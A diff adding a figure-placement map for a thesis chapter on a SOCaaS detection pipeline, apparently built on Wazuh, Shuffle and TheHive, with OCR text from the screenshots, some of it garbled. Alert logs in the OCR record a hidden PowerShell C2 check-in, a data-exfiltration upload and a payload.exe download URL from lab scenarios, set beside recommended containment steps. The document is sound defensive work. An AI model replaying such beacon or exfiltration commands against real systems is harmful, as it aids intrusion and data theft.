@@ -1,0 +1,564 @@
+NEW CHAPTER 4 FIGURES - RENAMED FILE MAP + OCR + PLACEMENT
+Put the files from newones_ch4_renamed_figs.zip inside your LaTeX project figs/ folder.
+Important warnings:
+- kubernetes_packages_installed.png shows Kubernetes v1.30.14, but the older Chapter 4 text may say v1.28.15. Make these consistent.
+- pipeline_gateway_pod_service.png shows Pipeline Gateway service exposure, but the pods are READY 0/1 and Orborus shows Error. Use carefully or retake when everything is healthy.
+- The uploaded ch4.tex macro currently hardcodes figs/Cassandra.png in every figure. Codex must fix this; otherwise all figures render as Cassandra.png.
+
+==========================================================================================
+Original: End-to-end SOCaaS pipeline diagram.jpg
+Renamed:  socaas_end_to_end_pipeline_diagram.jpg
+Target:   Section 4.6 End-to-End Detection and Response Pipeline; replace placeholder fig:ch4-end-to-end-pipeline.
+Caption:  End-to-End SOCaaS Detection and Response Pipeline
+Label:    fig:ch4-end-to-end-pipeline
+Width:    0.92\textwidth
+Note:     AI-generated conceptual diagram. Safe to use as architecture figure.
+OCR / visible text summary:
+(os)
+fof | p «dO ;
+| Ea Y ? ~~
+ae Wazuh Manager is eas
+Victim Endpoint 8 Pipeline Gateway
+|
+a |
+M ») — lg) ES r : Telegram
+. oe
+| Alert Forwarder i io yan L Xx
+tot cL —— Shuffle SOAR >
+— |_| | Email
+Wazuh Agent Top =
+eo Siig ee
+TheHive Al Sandbox DeepSeek-V4-Pro
+Case Management & Automated Threat Advanced Report
+Incident Response Xe Analysis y Generation
+==========================================================================================
+Original: Kubernetes packages installed.png
+Renamed:  kubernetes_packages_installed.png
+Target:   Section 4.3 Deployment of the Kubernetes Cluster; replace placeholder fig:ch4-kubernetes-packages.
+Caption:  Installed Kubernetes Packages and Versions
+Label:    fig:ch4-kubernetes-packages
+Width:    0.92\textwidth
+Note:     WARNING: OCR shows v1.30.14, while current thesis text says v1.28.15. Update the text to v1.30.14 or replace this screenshot with a v1.28.15 screenshot.
+OCR / visible text summary:
+e» srv/socaas > on &P main !16 714
+> kubeadm version aad
+kubectl version —-client
+kubelet -—-version
+kubeadm version: &version.Info{Major:"1", Minor:"30", GitVersion:"v1.30.14",
+GitCommit:"9e18483918821121abdf9aa82bc14d66df5d68cd", GitTreeState:"clean",
+BuildDate:"2025-06-177118:34:53Z", GoVersion:"go1.23.10", Compiler:"gc", Pla
+tform:"linux/amd64"}
+Client Version: v1.30.14
+Kustomize Version: v5.0.4—-0.20230601165947-6ce0bf390ce3
+Kubernetes v1.30.14
+==========================================================================================
+Original: Pipeline Gateway pod + service.png
+Renamed:  pipeline_gateway_pod_service.png
+Target:   Section 4.4.2 Pipeline Gateway Deployment; replace placeholder fig:ch4-pipeline-pod-service.
+Caption:  Pipeline Gateway Pod and Kubernetes Service
+Label:    fig:ch4-pipeline-pod-service
+Width:    0.95\textwidth
+Note:     Shows kubectl get pods and kubectl get svc in socaas-soar with NodePort 30001. WARNING: screenshot shows READY 0/1 and one Orborus Error; use only as service exposure evidence or retake when healthy.
+OCR / visible text summary:
+e» srv/socaas > on ®P main !16 714
+> kubectl get pods —-n socaas-soar
+kubectl get svc -n socaas-—soar
+NAME READY STATUS RESTARTS AGE
+socaas—pipelLine-gateway-75979cbc9c-56n7t 0/1 Running 9 (3s ago) 15d
+socaas—redis—76bbdc5b7-9wpwq 0/1 Running 18 (7d2h ago) 22d
+socaas—shuff le-backend-6f8b8b687b-dgf lt 0/1 Running 18 (7d2h ago) 22d
+socaas—shuff le-frontend—5f45d4768d-2qsnp 0/1 Running 21 (7d2h ago) 22d
+socaas—shuff le-opensearch-® 0/1 Running 18 (7d2h ago) 22d
+socaas—shuff le-orborus—86cfbb7796-6x4kj 0/1 Error 8 15d
+NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE
+docker-tcp ClusterIP 10.108.98.206 <none> 2375/TCP 19d
+socaas—pipeline-gateway NodePort 10.99.57.196 <none> 8080: 30001/TCP 22d
+socaas—redis ClusterIP 10.96.17.16 <none> 6379/TCP 22d
+socaas—shuff le-—backend ClusterIP 10.104.153.174 <none> 5001/TCP 22d
+socaas-—shuff le-frontend NodePort 10.107.175.241 <none> 80:30080/TCP 22d
+socaas—shuff le-opensearch ClusterIP 10.107.25.203 <none> 9200/TCP 22d
+==========================================================================================
+Original: build telegram payload shuffle.png
+Renamed:  shuffle_build_telegram_payload_node.png
+Target:   Section 4.4.3 Shuffle SOAR Deployment, after workflow canvas or in implementation evidence appendix.
+Caption:  Shuffle Build Telegram Payload Node Output
+Label:    fig:ch4-shuffle-build-telegram-payload
+Width:    0.48\textwidth
+Note:     Node-level evidence showing HTML Telegram payload with chat_id and parse_mode.
+OCR / visible text summary:
+yi Build Telegram Payload
+execute_python
+S)
+"Results for Build Telegram Payload"
+{ a
+2 items ©
+"success" : i
+©"message" : { 3 items &
+"status" : "ready" i
+"telegram _message" :
+"AY <b>SOCaaS Alert: Network
+Event</b> <b>@ Severity</b> °
+Level: <code>CRITICAL</code> «
+SOC Score..."
+©O"telegram payload json": {
+3 items ©
+"chat_id" : "1459553963" i
+"text" :
+"MX <b>SOCaaS Alert: Network
+Event</b> <b>@ Severity</b>
+¢ Level:
+<code>CRITICAL</code> * SOC
+Score..."
+"parse mode" : "HTML" &
+}
+t
+}
+==========================================================================================
+Original: build virustotal target.png
+Renamed:  shuffle_build_virustotal_target_node.png
+Target:   Section 4.4.3 Shuffle SOAR Deployment, after workflow canvas or in implementation evidence appendix.
+Caption:  Shuffle VirusTotal Target Builder Output
+Label:    fig:ch4-shuffle-build-virustotal-target
+Width:    0.55\textwidth
+Note:     Node-level evidence for target extraction before enrichment.
+OCR / visible text summary:
+‘ Build VirusTotal Target
+if execute _python
+"Results for
+Build VirusTotal Target" :
+{ a
+2 items ©
+"success" : i
+"message" : {...} 61 items &
+}
+==========================================================================================
+Original: c2 Recommended Analyst Actions.png
+Renamed:  ai_recommendations_c2_beacon.png
+Target:   Section 4.10.3 C2 Beacon Validation or Appendix B.
+Caption:  AI Recommended Analyst Actions for C2 Beacon Detection
+Label:    fig:ch4-c2-ai-recommendations
+Width:    0.95\textwidth
+Note:     Good fit for Appendix B or a short validation evidence figure.
+OCR / visible text summary:
+BD Alert Metadata
+e Alert ID: c2-1779128250
+e Source: wazuh
+e Location: EventChannel
+e Manager: socaas-wazuh-manager-0
+Raw Log
+Microsoft-Windows-Sysmon Event ID 3: Network connection detected. Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershelLexe User=win10-
+victim\khalil Sourcelp=192.168.122.98 SourcePort=49822 Destinationlp=104.21.0.170 DestinationPort=443 Protocol=tcp DestinationHostname=c2-demo.socaas-
+lab.example CommandLine=powershelLexe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command Invoke-WebRequest -Uri https://c2-demo.socaas-
+lab.example/api/checkin -Method POST
+& Recommended Analyst Actions
+¢ Isolate the endpoint win10-victim to prevent further C2 communication.
+¢ Collect full memory dump and relevant forensic artifacts from the compromised host.
+e Review firewall and proxy logs for additional connections from 192.168.122.98 to suspicious domains.
+¢ Check for persistence mechanisms (scheduled tasks, run keys, services) leveraging PowerShell.
+¢ Query threat intelligence platforms for the domain c2-demo.socaas-lab.example and IP 104.21.0.170.
+¢ Search for similar command lines (Invoke-WebRequest with /api/checkin) across the environment to detect lateral movement.
+¢ Escalate to incident response team for comprehensive containment and eradication.
+==========================================================================================
+Original: create the hive case shuffle.png
+Renamed:  shuffle_create_thehive_case_node.png
+Target:   Section 4.4.3 or 4.4.4; use after workflow execution or TheHive case management subsection.
+Caption:  Shuffle TheHive Case Creation Node Output
+Label:    fig:ch4-shuffle-create-thehive-case-node
+Width:    0.55\textwidth
+Note:     Shows POST success status 201 for case creation.
+OCR / visible text summary:
+‘ © Create TheHive Case
+POST
+"Results for Create TheHive Case": {
+6 items ©
+"status" : 2012
+"body" :{...} 24 items ©
+"url" :
+"http://192.168.122.1:30900/api/v1/
+"headers" : {...} 5 items &
+"cookies" : {} 0 items &
+"success" : i
+}
+==========================================================================================
+Original: exfil recommended analyst actions.png
+Renamed:  ai_recommendations_data_exfiltration.png
+Target:   Section 4.7 AI-Assisted Alert Triage or Appendix B/C as exfiltration evidence.
+Caption:  AI Recommended Analyst Actions for Data Exfiltration Alert
+Label:    fig:ch4-exfil-ai-recommendations
+Width:    0.95\textwidth
+Note:     Good proof that the AI node generates concrete containment and investigation steps.
+OCR / visible text summary:
+B Alert Metadata
+# Alert ID: exfil-1779130290
+# Source: wazuh
+« Locatior
+eventChannel
+* Manager: socaas-wazuh-manager-0
+Raw Log
+Microsoft-Windows-Sysmon Event ID 3: Possible data exfiltration. Image=C:\Windows\System32\WindowsPowerShellW1.0\powershelLexe User=win10-victim\khalil
+Sourcelp=192.168.122.98 Destination|
+104.21.0.170 DestinationPort=443 BytesSent=52428800 FileName=customer_backup.zip
+& Recommended Analyst Actions
+.
+Verify the contents of the uploaded file (customer_backup.zip) by obtaining a copy from the endpoint and analyzing it for sensitive data.
+Correlate the user (khalil) activity with their regular duties; check if the upload to transfer.socaas-lab.example is authorized or expected.
+Examine the external domain (transfer.socaas-lab.example] and IP (104.21.0.170) for reputation; check passive DNS and threat intelligence.
+Review the PowerShell command line and determine if the script was invoked manually or via a scheduled task / other process.
+Check for any other similar outbound connections from win0-victim to cloud storage or unusual destinations in recent logs.
+If confirmed unauthorized, isolate the host and initiate incident response procedures for data exfiltration,
+Investigate Sysmon Event ID 3 logs for additional network connections and review recent file creation events for the zip file.
+==========================================================================================
+Original: final response suffle.png
+Renamed:  shuffle_final_response_node.png
+Target:   Section 4.4.3 after workflow execution or appendix evidence.
+Caption:  Shuffle Final Response Node Output
+Label:    fig:ch4-shuffle-final-response-node
+Width:    0.55\textwidth
+Note:     Shows final success response after workflow completion.
+OCR / visible text summary:
+Final Response
+‘>
+execute_python
+O"Results for Final Response"
+2 items ©
+"success"
+py
+=
+"message"
+{...} 15 items ©
+==========================================================================================
+Original: generate ai recommended actions shuffle.png
+Renamed:  shuffle_generate_ai_recommended_actions_node.png
+Target:   Section 4.7 AI-Assisted Alert Triage; add near explanation of the AI recommendation node.
+Caption:  Shuffle AI Recommended Actions Node Output
+Label:    fig:ch4-shuffle-ai-recommendations-node
+Width:    0.55\textwidth
+Note:     Direct evidence of the AI recommendation node returning structured message data.
+OCR / visible text summary:
+Generate Al Recommended
+as
+Actions
+execute_python
+©
+"Results for
+Generate AI Recommended Actions"
+{
+2 items ©
+gs
+al
+1
+"success"
+"message"
+{...} 69 items ©
+==========================================================================================
+Original: helm deployment success.png
+Renamed:  helm_deployment_success.png
+Target:   Section 4.5 Implementation of the SOCaaS Helm Chart; replace placeholder fig:ch4-helm-deployment.
+Caption:  Successful SOCaaS Helm Deployment
+Label:    fig:ch4-helm-deployment
+Width:    0.98\textwidth
+Note:     Shows helm list -A with socaas release deployed in socaas-system.
+OCR / visible text summary:
+e>
+srv/socaas/SOCaaS_ BLUEPRINT MULTINODE > on ® P main !16 714
+> helm list -A
+at kubernetes-admin@kubernetes © < at 07:29:51 PM © 5)
+NAME
+NAMESPACE
+REVISION
+UPDATED
+STATUS
+CHART
+APP VERSION
+lsocaas
+socaas-system
+21
+2026-05-11 13:50:04.62504949 +0100 CET deployed
+socaas-1.0.0
+eC)
+==========================================================================================
+Original: helm templates folder.png
+Renamed:  helm_templates_folder.png
+Target:   Section 4.5; replace placeholder fig:ch4-helm-templates.
+Caption:  SOCaaS Helm Templates Folder
+Label:    fig:ch4-helm-templates
+Width:    0.60\textwidth
+Note:     Shows templates such as namespaces, networkpolicies, pipeline, shuffle, thehive, wazuh.
+OCR / visible text summary:
+>
+charts/socaas/templates
+“helpers. tall
+namespaces. yaml
+networkpolicies.yaml
+NOTES. txt
+pipeline. yaml
+rbac. yaml
+secrets. yaml
+shuffle. yaml
+storage. yaml
+thehive. yaml
+wazuh. yaml
+11 files
+1 directory,
+==========================================================================================
+Original: malware Recommended Analyst Actions.png
+Renamed:  thehive_malware_case_ai_recommendations.png
+Target:   Section 4.9 AI Sandbox Case Study, after paragraph about recommendations; or Section 4.4.4 TheHive case management.
+Caption:  TheHive Malware Case with AI Recommended Actions
+Label:    fig:ch4-thehive-malware-ai-recommendations
+Width:    0.95\textwidth
+Note:     Good replacement/addition for fig:ch4-created-thehive-case if it is sharper or shows recommendations better.
+OCR / visible text summary:
+FEZEI [SOCaas|[CRITICAL][malware] Rule 100500 - victim-O1
+® id ~8384
+& General
+# Tasks (0)
+@ Observables (0)
+2 TTPs (0)
+® Attachments
+© Timeline
+D Pages
+Q
+w
+~
+_
+a
+2
+Created by
+‘SOCaaS Shuffle Integratio
++ File Name: payloadexe
+n
+«File Path: t\nremarks:
+Created at 26/05/2026 19:38
+« File Hash: 44d88612fea8a8f36de82e1278abb02f6b0d7b6d7d9f6c7b5F3"SbScheSebeS
+« SHA256; 44d88612fea8a8136de82e1278abb02"Gb0d7b6d7d9f6c7b5F3fSbScbeSeSe5
+«Process Name: powershellexe
+* Command Line: powershelLexe -enc SQBFAFgA
+© Related Network Observables
+# Source IP: 192.168.122.180
+Assignee
+« Destination IP: 185.220.101.45
+e SOCaa& Shuffle Integration
+«Protocol: tep
+* Domain: malicious-update-service.com
+Status
+© URL: http://malicious-update-service.com/payload.exe
+@ New
+« DNS Query: malicious-update-service.com
+B Alert Metadata
+Start date
+# Alert ID: soc-1779820708
+26/05/2026 19:37
+# Source: wazuh
+« Manager: socaas-wazuh-manager
+‘Tasks completion
+%X Recommended Analyst Actions
+No tasks
+.
+Isolate the affected endpoint (victim-01) from the network to prevent further malicious communication.
+Contributors
+Decode the base64 PowerShell command line ("-enc SQBFAFgA") to reveal the full payload and intent.
+Search for and capture the file payload.exe on the endpoint; submit it to a sandbox for dynamic analysis.
+ts]
+Perform DNS and WHOIS lookups on the domain malicious-update-service.com; check threat intelligence feeds.
+e to detect
+Correlate this alert with other endpoints for similar outbound connections or PowerShell activity.
+1 seconds
+Review firewall and proxy logs for all outbound traffic from 192.168.122.180 to 185.220.101.45.
+Escalate to incident response team for further remediation and containment if malware is confirmed.
+==========================================================================================
+Original: nmap scan telegram notification.png
+Renamed:  telegram_nmap_scan_notification.png
+Target:   Section 4.10.2 Nmap Port Scan Validation or Appendix A.
+Caption:  Telegram Notification for Nmap Port Scan Detection
+Label:    fig:ch4-telegram-nmap-scan
+Width:    0.55\textwidth
+Note:     Good validation evidence for Appendix A; not necessary in main chapter unless space allows.
+OCR / visible text summary:
+€
+@
+rj, SOCaaS Alert Bot
+bot
+ SOCaa Alert: Network Scan / Recon
+May 17
+@ Severity
++ Level: CRITICAL
++ SOC Score: 26
++ Case ID: S0c-20260517- 131506 -5717-scan-1779023739
+=m Host
++ Name: victim-01
++ IP: 192.168.122.180
+® Scan Details
++ Source IP: 196.251.105.231
++ Target IP: 192.168.122.180
++ Target Port: 3389
++ Protocol: TcP
++ Action: UFW BLOCK
++ Scan Tool: Nmap
+4 VirusTotal
++ Target:
+p / 196.251.105.231
+«Result: 2 malicious / 1 suspicious
+r | Rule
+“1D: 5717
++ Description: Nmap port scan detected against victim-01 from
+196.251.105.231
+Wazuh > VirusTotal > Shuffle > Email/TheHive
+==========================================================================================
+Original: normalize soc altert shuffle.png
+Renamed:  shuffle_normalize_soc_alert_node.png
+Target:   Section 4.4.3 after workflow canvas or appendix evidence.
+Caption:  Shuffle Normalize SOC Alert Node Output
+Label:    fig:ch4-shuffle-normalize-alert-node
+Width:    0.55\textwidth
+Note:     Node-level proof that normalization produced a structured 55-item message.
+OCR / visible text summary:
+, « > Normalize SOC Alert
+4
+execute_python
+"Results for Normalize SOC Alert"
+ul
+2 items
+ul
+success
+message
+{
+} 55 items =
+==========================================================================================
+Original: suffle runs.png
+Renamed:  shuffle_workflow_runs_new.png
+Target:   Section 4.4.3; REPLACE the old Shuffle Workflow Execution Result figure fig:ch4-shuffle-execution.
+Caption:  Shuffle Workflow Runs Showing Successful SOCaaS Executions
+Label:    fig:ch4-shuffle-execution
+Width:    0.58\textwidth
+Note:     This is the requested replacement for the old Shuffle runs screenshot.
+OCR / visible text summary:
+& All Workflow Runs
+wk
+la
+s
+£37 REFRESH RUNS
+\
+}
+ABORTED
+FINISHED EXECUTING
+18/05/2026, 19:50:54
+10+0=10
+© >
+1s
+18/05/2026, 19:16:53
+10+0=10
+©
+®
+17/05/2026, 14:27:37
+10+0=10
+GS
+r2)
+17/05/2026, 14:24:50
+10+0=10
+1s
+®
+17/05/2026, 14:15:02
+10+0=10
+GS
+r2)
+17/05/2026, 14:11:28
+10 +0=10
+1S)
+==========================================================================================
+Original: suffle welcome page.png
+Renamed:  shuffle_welcome_dashboard.png
+Target:   Section 4.4.3; replace placeholder fig:ch4-shuffle-dashboard.
+Caption:  Shuffle Dashboard and Application Workspace
+Label:    fig:ch4-shuffle-dashboard
+Width:    0.82\textwidth
+Note:     Shows Shuffle UI/home/workspace where apps and workflow tools are managed.
+OCR / visible text summary:
+<
+ch
+cerk
+Find your apps
+Select the apps you work with and we will connect them for you,
+() Automate
++ Usecases
+Intel
++ Workflows
+%
+Cases
+@
+virustotal v3
++ Apps
+= Content
+Q
+SIEM
+() Email
+© Documentation
+& Admin
+@ EDR
+See More Apps
+ES
+==========================================================================================
+Original: telegram notification malware.png
+Renamed:  telegram_malware_notification.png
+Target:   Section 4.10.1 Malware and AI Sandbox Validation or notification evidence after TheHive case.
+Caption:  Telegram Notification for Malware Detection
+Label:    fig:ch4-telegram-malware-notification
+Width:    0.55\textwidth
+Note:     Good validation evidence for alert delivery in malware scenario.
+OCR / visible text summary:
+SOCaaS Alert Bot
+bot
+& SOCaaS Alert: Malware Detection
+@ Severity
++ Level: CRITICAL
++ SOC Score: 21
++ Case ID: Soc-20260517 -130308-554-eicar-malware-
+1778807852
+= Host
++ Name: DESKTOP-2CA1J07
++ IP: 192.168.122.98
+Sf Malware Details
++ File: C:\Users\win10-
+victim\AppData\Roaming\MicrosoftEdge\update_helper.exe
++ Path: C:\\Users\\win10-
+victim\\AppData\ \Roaming\\MicrosoftEdge\\update_helper.ex
+e
++ Hash:
+275a021bbfb6489e54d47 1899 f7db9d1663f c695ec2fe2a2c4538aab
+f651fdof
+4 VirusTotal
+Target: file hash /
+275a021bbfb6489e54d47 1899 f 7db9d1663f c695ec2fe2a2c4538aabt
+651fdof
++ Result: 66 malicious / © suspicious
+Mi Rule
+“1D: 554
++ Description: EICAR test file detected - known malware hash
+Wazuh > VirusTotal > Shuffle > Email/TheHive
+==========================================================================================
+Original: tree helm chart structure.png
+Renamed:  helm_chart_structure_tree.png
+Target:   Section 4.5; replace placeholder fig:ch4-helm-chart-structure.
+Caption:  SOCaaS Helm Chart Directory Structure
+Label:    fig:ch4-helm-chart-structure
+Width:    0.62\textwidth
+Note:     Shows Chart.yaml, values.yaml, values-multinode.yaml and templates directory.
+OCR / visible text summary:
+>
+charts/socaas
+Chart. yaml
+_helpers.tpl
+namespaces. yaml
+networkpolicies.yaml
+NOTES. txt
+pipeline. yaml
+rbac. yaml
+secrets.yaml
+shuffle. yaml
+storage. yaml
+thehive. yaml
+wazuh. yamL
+vaLlues—multinode. yaml
+values. yaml
+2 directories,
+14 files
